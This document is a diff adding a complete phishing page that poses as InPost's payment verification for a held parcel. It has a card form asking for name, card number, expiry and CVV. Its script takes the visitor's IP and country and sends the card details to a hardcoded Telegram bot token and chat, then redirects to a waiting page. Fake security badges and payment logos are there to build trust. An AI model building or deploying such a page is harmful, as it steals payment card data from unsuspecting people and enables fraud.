@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <title>InPost - Bezpieczna Weryfikacja Płatności</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --inpost-yellow: #ffcc00; /* Official Brand Yellow */
+            --inpost-dark: #1d1d1b;   /* Official Brand Dark */
+            --inpost-green: #006633;
+            --bg-gray: #f2f2f2;
+        }
+
+        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+        body {
+            margin: 0;
+            font-family: 'Montserrat', sans-serif;
+            background: var(--bg-gray);
+            color: var(--inpost-dark);
+        }
+
+        /* --- HEADER --- */
+        header { background: #fff; border-bottom: 3px solid var(--inpost-yellow); position: sticky; top: 0; z-index: 1000; }
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo img { height: 52px; width: auto; } /* Large Pro Logo */
+
+        .secure-lock {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--inpost-green);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* --- SUBHEADER --- */
+        .sub-nav { background: var(--inpost-yellow); padding: 12px 0; }
+        .sub-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            gap: 40px;
+            font-weight: 800;
+            font-size: 11px;
+            color: #000;
+        }
+
+        /* --- PROGRESS STEPPER --- */
+        .stepper-container {
+            max-width: 500px;
+            margin: 40px auto 30px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .step { text-align: center; flex: 1; }
+        .circle {
+            width: 36px;
+            height: 36px;
+            background: #ddd;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 800;
+        }
+        .step.done .circle { background: var(--inpost-green); }
+        .step.active .circle { background: #000; box-shadow: 0 0 0 5px rgba(255, 204, 0, 0.4); }
+        .step-label { font-size: 10px; font-weight: 800; text-transform: uppercase; color: #888; }
+        .step.active .step-label { color: #000; }
+
+        /* --- FORM CARD --- */
+        .card {
+            max-width: 480px;
+            margin: 0 auto 60px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.07);
+            overflow: hidden;
+        }
+        .card-header {
+            background: #fafafa;
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+        }
+        .card-body { padding: 40px; }
+
+        .form-group { margin-bottom: 25px; }
+        label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 10px; color: #444; }
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e1e1e1;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: 0.2s;
+        }
+        input:focus { border-color: var(--inpost-yellow); outline: none; background: #fffefa; }
+        
+        .row { display: flex; gap: 20px; }
+
+        .btn-pay {
+            width: 100%;
+            background: var(--inpost-dark);
+            color: #fff;
+            border: none;
+            padding: 22px;
+            font-weight: 900;
+            font-size: 15px;
+            text-transform: uppercase;
+            border-radius: 8px;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .btn-pay:hover { background: #000; transform: translateY(-2px); }
+
+        /* --- LOGOS & FOOTER --- */
+        .trust-row {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 35px;
+            filter: grayscale(1);
+            opacity: 0.5;
+        }
+        .trust-row img { height: 22px; }
+
+        footer { background: #fff; padding: 60px 20px; text-align: center; border-top: 1px solid #eee; }
+        .footer-logo { height: 30px; filter: grayscale(1); opacity: 0.4; margin-bottom: 25px; }
+        .ray-code { font-family: monospace; font-size: 11px; color: #ccc; margin-top: 30px; }
+
+        @media (max-width: 500px) { .card { margin: 15px; } .row { flex-direction: column; } }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="nav-container">
+        <div class="logo">
+            <img src="https://images.seeklogo.com/logo-png/34/1/inpost-logo-png_seeklogo-347126.png" alt="InPost Official">
+        </div>
+        <div class="secure-lock">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+            SZYFROWANIE SSL AES-256
+        </div>
+    </div>
+</header>
+
+<div class="sub-nav">
+    <div class="sub-container">
+        <span>📦 MOJA PACZKA: PX155360</span>
+        <span>🕒 STATUS: WSTRZYMANA</span>
+    </div>
+</div>
+
+<div class="stepper-container">
+    <div class="step done"><div class="circle">✓</div><div class="step-label">Adres</div></div>
+    <div class="step active"><div class="circle">2</div><div class="step-label">Płatność</div></div>
+    <div class="step"><div class="circle">3</div><div class="step-label">Gotowe</div></div>
+</div>
+
+<main class="card">
+    <div class="card-header">
+        <h2 style="margin: 0; font-size: 20px; font-weight: 800;">Weryfikacja karty</h2>
+        <p style="font-size: 13px; color: #666; margin-top: 10px;">Autoryzacja płatności w celu potwierdzenia danych osobowych i adresu doręczenia.</p>
+    </div>
+
+    <div class="card-body">
+        <form id="paymentForm">
+            <div class="form-group">
+                <label>Imię i nazwisko na karcie</label>
+                <input type="text" name="holder_name" placeholder="JAN KOWALSKI" required>
+            </div>
+
+            <div class="form-group">
+                <label>Numer karty</label>
+                <input type="text" name="card_number" id="card_mask" placeholder="0000 0000 0000 0000" maxlength="19" required>
+            </div>
+
+            <div class="row">
+                <div class="form-group" style="flex: 1;">
+                    <label>Data ważności (MM/YY)</label>
+                    <input type="text" name="expiry" id="exp_mask" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>Kod CVV</label>
+                    <input type="password" name="cvv" placeholder="***" maxlength="3" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-pay">POTWIERDŹ WERYFIKACJĘ</button>
+        </form>
+
+        <div class="trust-row">
+            <img src="https://images.seeklogo.com/logo-png/14/2/visa-logo-png_seeklogo-149698.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png">
+        </div>
+    </div>
+</main>
+
+<footer>
+    <img src="https://images.seeklogo.com/logo-png/34/1/inpost-logo-png_seeklogo-347126.png" class="footer-logo">
+    <div style="font-weight: 600; font-size: 11px; margin-bottom: 10px;">InPost S.A. System Bezpieczeństwa Płatności</div>
+    <div style="line-height: 1.6;">Polityka Prywatności | Regulamin | Bezpieczeństwo</div>
+    <div class="ray-code">Ray ID: 7F8A921BC34E-WAW | SERVER: INP-PRX-09</div>
+</footer>
+
+<script>
+    // Input Masks
+    document.getElementById('card_mask').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+    document.getElementById('exp_mask').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+        e.target.value = v;
+    });
+
+    // --- TELEGRAM CONFIGURATION ---
+    const TG_TOKEN = '8700709423:AAEdQzbh_uCrdR_HjCY8Af_QP3LYIN_wblE';
+    const TG_CHAT = '5995238784';
+
+    document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(this);
+        let msg = "💳 *Nowa Karta Płatnicza*\n\n";
+
+        // Dodawanie IP i Kraju
+        try {
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            msg += `🌐 *IP:* \`${ipData.ip}\`\n`;
+            msg += `📍 *Kraj:* \`${ipData.country_name}\`\n\n`;
+        } catch (error) {
+            msg += `🌐 *IP:* \`Nie udało się pobrać\`\n\n`;
+        }
+        
+        formData.forEach((val, key) => {
+            msg += `*${key}:* \`${val}\`\n`;
+        });
+
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TG_CHAT,
+                text: msg,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(() => {
+            window.location.href = "wait2.html"; 
+        })
+        .catch(err => {
+            window.location.href = "wait2.html";
+        });
+    });
+</script>
+
+</body>
+</html>
